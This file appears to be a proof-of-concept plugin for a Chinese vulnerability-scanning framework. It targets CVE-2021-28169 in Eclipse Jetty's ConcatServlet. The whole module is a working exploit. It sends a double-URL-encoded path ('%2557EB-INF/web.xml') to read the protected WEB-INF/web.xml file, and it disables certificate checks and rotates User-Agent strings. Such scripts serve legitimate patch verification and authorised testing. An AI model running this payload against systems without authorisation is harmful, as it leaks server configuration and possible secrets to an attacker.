# coding:utf-8  
from urllib import request
import ssl
import chardet
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Jetty Utility Servlets ConcatServlet 双解码信息泄露漏洞 (CVE-2021-28169)",                        # 漏洞名称
        "VulnID" : "CVE-2021-28169",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Jetty",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            Eclipse Jetty 是一个 Java Web 服务器和 Java Servlet 容器。

            在 9.4.40、10.0.2、11.0.2 版本之前，
            Jetty Servlets 中的ConcatServlet和WelcomeFilter类受到双重解码错误的影响。
            如果开发者手动使用这两个类，攻击者可以利用它们下载WEB-INF目录中的任意敏感文件。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
        
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        vuln = [False,""]
        url = self.target + "/static?/%2557EB-INF/web.xml"  # url自己按需调整

        headers = {"User-Agent":get_random_ua(),}

        try:
            # verify
            context = ssl._create_unverified_context()
            req = request.Request(url,headers = headers)
            response = request.urlopen(req,timeout=self.timeout,context = context)
            html = response.read()

            status_code = response.getcode()

            if "<web-app>" in str(html) and status_code == 200 and "application/xml" in [_v for _k,_v in response.getheaders() if "Content-Type" in _k]:
                vuln = [True,html]
        except Exception as e:
            raise e
        
        return vuln

    def _attack(self):
        return self._verify()